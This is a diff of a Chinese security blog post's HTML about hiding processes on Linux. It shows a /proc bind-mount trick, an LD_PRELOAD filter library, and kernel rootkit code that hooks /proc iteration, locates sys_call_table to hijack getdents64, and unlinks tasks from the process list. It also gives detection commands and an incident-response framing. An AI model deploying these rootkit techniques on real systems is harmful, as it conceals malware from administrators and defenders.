class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/huanhuan/tags/CC%E9%93%BE/" style="font-size: 1.05rem;">CC链<sup>1</sup></a><a href="/huanhuan/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>1</sup></a><a href="/huanhuan/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="font-size: 1.05rem;">漏洞分析<sup>1</sup></a><a href="/huanhuan/tags/%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/" style="font-size: 1.05rem;">隐藏进程<sup>1</sup></a><a href="/huanhuan/tags/%E9%A9%AC/" style="font-size: 1.05rem;">马<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/huanhuan/archives/2024/07/"><span class="card-archive-list-date">July 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/huanhuan/archives/2024/06/"><span class="card-archive-list-date">June 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/huanhuan/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/huanhuan/tags/%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>隐藏进程</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Linux下的隐藏进程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-06-19T16:00:00.000Z" title="发表于 2024-06-20 00:00:00">2024-06-20</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-11-15T16:28:42.542Z" title="更新于 2024-11-16 00:28:42">2024-11-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://w-lovezz.github.io/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/"><header><a href="/huanhuan/tags/%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/" tabindex="-1" itemprop="url">隐藏进程</a><h1 id="CrawlerTitle" itemprop="name headline">Linux下的隐藏进程</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">huanhuan</span><time itemprop="dateCreated datePublished" datetime="2024-06-19T16:00:00.000Z" title="发表于 2024-06-20 00:00:00">2024-06-20</time><time itemprop="dateCreated datePublished" datetime="2024-11-15T16:28:42.542Z" title="更新于 2024-11-16 00:28:42">2024-11-16</time></header><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;之前一篇谈ebpf实现的后门的时候讲到利用了隐藏后门的技术，当时是hook了系统调用函数，在查询的时候通过篡改返回值的方式实现了进程的隐藏，但无论是利用方式还是兼容性都存在一些困难，所以通过这篇文章带大家了解一些常见的隐藏进程的方式和原理，同时也学习了一些更深层的隐藏进程的方式也同时分享些学习心得给大家。</p>
 <h2 id="进程查看"><a href="#进程查看" class="headerlink" title="进程查看"></a>进程查看</h2><p>&emsp;在讲隐藏进程之前，先带大家了解下查看进程的一些原理。我们都知道Linux看进程一般用到的就是ps、top、pstree。ps看到的是命令执行瞬间的进程信息，而top可以持续对进程的监视。那么他们是通过什么方式将进程都有哪些读取出来并展示的呢？</p>
-<p>&emsp;我们先尝试执行ps的命令，通过跟踪查看ps的整个在系统里执行的过程发现，ps实际是通过遍历proc文件的内容去输出结果的，以之前的内存马的进程为例：<br><img src="https://github.com/w-lovezz/image/raw/main/ps-loader.png" /></p>
-<p>跟踪ps执行的过程：<br><img src="https://github.com/w-lovezz/image/raw/main/strace.png" /></p>
-<p>跟踪top执行的过程，发现部分过程一致，只不过还会显示些执行事件，cpu占用率等内容：<br><img src="https://github.com/w-lovezz/image/raw/main/top.jpg" /></p>
+<p>&emsp;我们先尝试执行ps的命令，通过跟踪查看ps的整个在系统里执行的过程发现，ps实际是通过遍历proc文件的内容去输出结果的，以之前的内存马的进程为例：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/ps-loader.png" /></p>
+<p>跟踪ps执行的过程：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/strace.png" /></p>
+<p>跟踪top执行的过程，发现部分过程一致，只不过还会显示些执行事件，cpu占用率等内容：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/top.jpg" /></p>
 <p>&emsp;综上我们发现这些命令都是通过遍历proc文件内容来读取展示进程的，那proc又是什么呢？&#x2F;proc是一个Linux独有的伪文件系统，只存在在内核中，不占用外存空间，以文件系统的方式为访问系统内核数据的操作提供接口，而在&#x2F;proc中，每一个进程都有一个相应的文件，以PID号命名。而ps，top等命令都是针对&#x2F;proc下的文件夹做查询从而输出结果。</p>
 <h2 id="隐藏进程（用户态）"><a href="#隐藏进程（用户态）" class="headerlink" title="隐藏进程（用户态）"></a>隐藏进程（用户态）</h2><h3 id="命令替换"><a href="#命令替换" class="headerlink" title="命令替换"></a>命令替换</h3><p>&emsp;命令替换是一种简单常见的隐藏进程方式，既然需要通过ps、top、lsof等查看进程，那么使用我们自己做好的命令文件替代即可，当然这也很容易被发现，如通过stat查看文件状态或查看文件的hash即可发现。</p>
-<h3 id="隐藏-proc-pid"><a href="#隐藏-proc-pid" class="headerlink" title="隐藏&#x2F;proc&#x2F;pid"></a>隐藏&#x2F;proc&#x2F;pid</h3><p>&emsp;既然&#x2F;proc目录存在了和进程相关的文件夹，那么隐藏进程对应的文件夹同样可达到隐藏进程的目的<br>写一个sh脚本，通过ps查看进程<br><img src="https://github.com/w-lovezz/image/raw/main/sh.png" /><br>创建一个空文件夹并实现挂载</p>
+<h3 id="隐藏-proc-pid"><a href="#隐藏-proc-pid" class="headerlink" title="隐藏&#x2F;proc&#x2F;pid"></a>隐藏&#x2F;proc&#x2F;pid</h3><p>&emsp;既然&#x2F;proc目录存在了和进程相关的文件夹，那么隐藏进程对应的文件夹同样可达到隐藏进程的目的<br>写一个sh脚本，通过ps查看进程<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/sh.png" /><br>创建一个空文件夹并实现挂载</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> mount</span><br><span class="line">mount -<span class="built_in">bind</span> /path/mount/ /proc/pid</span><br></pre></td></tr></table></figure>
-<p>即可发现看不到该进程了，如想恢复使用unmount即可<br><img src="https://github.com/w-lovezz/image/raw/main/hide.png" /><br>那如何检查&#x2F;proc目录是否有文件夹被挂载呢？<br>1）&#x2F;proc&#x2F;mounts</p>
+<p>即可发现看不到该进程了，如想恢复使用unmount即可<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/hide.png" /><br>那如何检查&#x2F;proc目录是否有文件夹被挂载呢？<br>1）&#x2F;proc&#x2F;mounts</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/mounts | grep proc</span><br></pre></td></tr></table></figure>
 <p>2）&#x2F;proc&#x2F;$$&#x2F;mountinfo</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/$$/mountinfo | grep proc</span><br></pre></td></tr></table></figure>
 <p>3）mount -l</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -l | grep proc</span><br></pre></td></tr></table></figure>
-<img src="https://github.com/w-lovezz/image/raw/main/cat.png"/>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/cat.png"/>
 
 
 <p>PS：挂载（Mount）的原理<br>&emsp;在 Linux 系统中，挂载是将一个文件系统（如分区、设备或目录）连接到现有的目录树上，使得该文件系统的内容在目录树的某个点（挂载点）上可见。挂载操作会覆盖挂载点原本的内容，使得新挂载的文件系统内容显示在该挂载点上。</p>
 <h3 id="Ring3劫持lib库"><a href="#Ring3劫持lib库" class="headerlink" title="Ring3劫持lib库"></a>Ring3劫持lib库</h3><p>&emsp;LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库，那么我们可以使用这种方式实现隐藏进程的目的。</p>
-<p>实现一个过滤进程名称为“ping”的代码<br><img src="https://github.com/w-lovezz/image/raw/main/ping.png" /><br>编译生成动态库</p>
+<p>实现一个过滤进程名称为“ping”的代码<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/ping.png" /><br>编译生成动态库</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o libfilter.so </span><br><span class="line">hide_process_by_name.c -ldl</span><br></pre></td></tr></table></figure>
-<img src="https://github.com/w-lovezz/image/raw/main/lib.png" />
-<img src="https://github.com/w-lovezz/image/raw/main/lib1.png" />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/lib.png" />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/lib1.png" />
 
 <h2 id="隐藏进程（内核态）"><a href="#隐藏进程（内核态）" class="headerlink" title="隐藏进程（内核态）"></a>隐藏进程（内核态）</h2><h3 id="Ring1劫持VFS"><a href="#Ring1劫持VFS" class="headerlink" title="Ring1劫持VFS"></a>Ring1劫持VFS</h3><p>&emsp;内核态隐藏进程的方法复杂但种类繁多，劫持VFS也算是一种老生常谈的技术，那么什么是VFS呢？<br>&emsp;VFS（Virtual File System，虚拟文件系统）是操作系统内核中的一个抽象层，用于提供对不同文件系统的统一访问接口。它允许应用程序通过一致的系统调用接口访问&amp;不同类型的文件系统，而不需要关心底层文件系统的具体实现细节。</p>
 <p>&emsp;VFS 的主要功能</p>
@@ -197,7 +254,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hacked_proc_root_readdir</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">struct</span> dir_context *ctx)</span> &#123;</span><br><span class="line">    original_filldir = ctx-&gt;actor;</span><br><span class="line">    *((<span class="type">filldir_t</span> *)&amp;ctx-&gt;actor) = hacked_filldir;</span><br><span class="line">    <span class="keyword">return</span> original_proc_root_readdir(file, ctx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>初始化函数在模块加载时执行。它打开 &#x2F;proc 目录，保存原始的 file_operations 结构，修改 iterate_shared和iterate指针以指向自定义的hacked_proc_root_readdir 函数，然后恢复内存保护。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hideping_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">proc_root</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">proc_inode</span>;</span></span><br><span class="line"></span><br><span class="line">    proc_root = filp_open(<span class="string">&quot;/proc&quot;</span>, O_RDONLY | O_DIRECTORY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(proc_root)) &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;hideping_init: Failed to open /proc\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(proc_root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    proc_inode = file_inode(proc_root);</span><br><span class="line">    original_fops = (<span class="keyword">struct</span> file_operations *)proc_inode-&gt;i_fop;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;hacked_fops, original_fops, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> file_operations));</span><br><span class="line">    original_proc_root_readdir = original_fops-&gt;iterate_shared ? original_fops-&gt;iterate_shared : original_fops-&gt;iterate;</span><br><span class="line">    hacked_fops.iterate_shared = hacked_proc_root_readdir;</span><br><span class="line">    hacked_fops.iterate = hacked_proc_root_readdir;</span><br><span class="line"></span><br><span class="line">    set_addr_rw();</span><br><span class="line">    *((<span class="keyword">struct</span> file_operations **)&amp;proc_inode-&gt;i_fop) = &amp;hacked_fops;</span><br><span class="line">    set_addr_ro();</span><br><span class="line"></span><br><span class="line">    filp_close(proc_root, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hideping_init: Module loaded\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>效果如下：<br><img src="https://github.com/w-lovezz/image/raw/main/proc_root_readdir.png" /><br><img src="https://github.com/w-lovezz/image/raw/main/dmesg.png" />·</p>
+<p>效果如下：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/proc_root_readdir.png" /><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/dmesg.png" />·</p>
 <h3 id="劫持系统调用"><a href="#劫持系统调用" class="headerlink" title="劫持系统调用"></a>劫持系统调用</h3><p>&emsp;之前使用strace ps的时候会看到在遍历进程目录之前会调用gatdents函数，该函数是Linux系统条用之一，用于读取目录条目，通常用于实现用户态的readdir功能；通过getdents，可以从一个打开的目录文件描述符中读取目录项的列表。那我们就可以通过劫持该函数实现隐藏进程。实现如下：</p>
 <p>查找系统调用表（通过比较系统调用表中 __NR_close 索引处的值是否等于 sys_close 的地址来确认），保存初始系统调用函数指针</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> **sys_call_table;</span><br><span class="line">asmlinkage <span class="title function_">long</span> <span class="params">(*original_getdents64)</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>, <span class="keyword">struct</span> linux_dirent64 *, <span class="type">unsigned</span> <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> **<span class="title function_">find_sys_call_table</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> offset = PAGE_OFFSET;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> **sct;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (offset &lt; ULLONG_MAX) &#123;</span><br><span class="line">        sct = (<span class="type">unsigned</span> <span class="type">long</span> **)offset;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sct[__NR_close] == (<span class="type">unsigned</span> <span class="type">long</span> *)sys_close)</span><br><span class="line">            <span class="keyword">return</span> sct;</span><br><span class="line"></span><br><span class="line">        offset += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -208,7 +265,151 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">//伪代码</span><br><span class="line">初始化一个内核模块将pid等内容作为参数</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//遍历系统进程，并找出你想隐藏的pid</span><br><span class="line">static struct task_struct *find_task_by_pid(pid_t pid) &#123;</span><br><span class="line">    struct task_struct *task;</span><br><span class="line">    for_each_process(task) &#123;</span><br><span class="line">        if (task-&gt;pid == pid)</span><br><span class="line">            return task;</span><br><span class="line">    &#125;</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//查找指定的进程并将其从任务链表中移除</span><br><span class="line">static int __init hide_process_init(void) &#123;</span><br><span class="line">    struct task_struct *task;</span><br><span class="line">    </span><br><span class="line">    //没有pid或者没找到进程正常报错返回</span><br><span class="line">    if (pid == -1) &#123;</span><br><span class="line">        return -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    task = find_task_by_pid(pid);</span><br><span class="line">    if (!task) &#123;</span><br><span class="line">        return -ESRCH;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    list_del(&amp;task-&gt;tasks);</span><br><span class="line">    printk(KERN_INFO &quot;Process with PID %d hidden.\n&quot;, pid);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br></pre></td></tr></table></figure>
 
 <h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>&emsp;感觉目前比较常见的隐藏方式就是这些了，包括上篇文章提到的结合ebpf隐藏进程也是在getdents函数做的手脚，但是在网上看到了一篇文章，介绍了InlineHook、Offset hook还有更多的方式，学习了下确实很难实现，看看后面能不能补充吧（TODO）。因为一直在做应急，所以排隐藏进程的情况还是比较容易遇见，所以也写了这篇流水账。</p>
-<p>附：实现了一个检查隐藏进程的脚本，遍历内存结构体的方式，同时也结合了其他手段一起验证，昨天测了下可以检测到libprocesshider隐藏的进程，有需要可以找我，但是基于5.x内核做的，可能有的版本不适配（centos普遍内核版本较低，很多函数没有）；<br><img src="https://github.com/w-lovezz/image/raw/main/scan.png" /></p>
+<p>附：实现了一个检查隐藏进程的脚本，遍历内存结构体的方式，同时也结合了其他手段一起验证，昨天测了下可以检测到libprocesshider隐藏的进程，有需要可以找我，但是基于5.x内核做的，可能有的版本不适配（centos普遍内核版本较低，很多函数没有）；<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.com/w-lovezz/image/raw/main/scan.png" /></p>
 <p>&emsp;声明：文中所使用的环境均为内网环境，本文仅用于学习交流目的，严禁将本文中的技术用于违法犯罪目的!!!!</p>
 <p>参考链接：<br>[1]<a target="_blank" rel="noopener" href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87.md">https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87.md</a><br>[2]<a target="_blank" rel="noopener" href="https://blog.brickgao.com/2016/08/07/simple-rootkit/">https://blog.brickgao.com/2016/08/07/simple-rootkit/</a></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://w-lovezz.github.io/huanhuan">huanhuan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://w-lovezz.github.io/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/">https://w-lovezz.github.io/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/huanhuan/tags/%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/">隐藏进程</a></div><div class="post-share"><div class="social-share" data-image="https://github.com/w-lovezz/image/raw/main/huanhuan.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/huanhuan/2024/07/05/GeoServer%20Jxpath%20RCE/" title="GeoServer Jxpath RCE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">GeoServer Jxpath RCE</div></div><div class="info-2"><div class="info-item-1">前言&emsp;在公司群看到GeoServer的一个RCE，起初没怎么接触过GeoServer就没打算分析，后来看到了是xpath导致的表达式注入，也算顺便回忆下Jxpath的那个RCE，就写了这个分析文章。 深度分析&emsp;是7月2看到漏洞通告的，最开始现在网上搜了搜，都是一些通告外加打码的POC，没看到分析文章；然后看了QAX威胁情报中心下面附的一些链接内容，官方文档介绍了一些可以被利用的点；&emsp;在github看到一个wps...</div></div></div></a><a class="pagination-related" href="/huanhuan/2024/05/28/%E4%BB%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%B0%E5%86%85%E6%A0%B8%E9%A9%AC%E5%88%B0Rookit/" title="从内存马到内核马"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">从内存马到内核马</div></div><div class="info-2"><div class="info-item-1">&emsp;之前写了两篇关于内存马的文章（没有更新到blog），从基本的中间件内存马原理的实现，到Agent注入，到线程型内存马的学习，再到最后实战的中的利用说的已经比较细致了；在本该结束这一个系列的时候突然看到了某位师傅在Github中提到的内核马，文章大概提到了该内核马是用ebpf技术实现的，提到了一下利用的思路和注意事项，由于之前也没接触过ebpf，加之师傅的文章也没写怎么实现，故有了此篇文章。先鸣谢lict...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://github.com/w-lovezz/image/raw/main/huanhuan.png" onerror="this.onerror=null;this.src='/huanhuan/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">huanhuan</div><div class="author-info-description"></div><div class="site-data"><a href="/huanhuan/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/huanhuan/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/huanhuan/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div 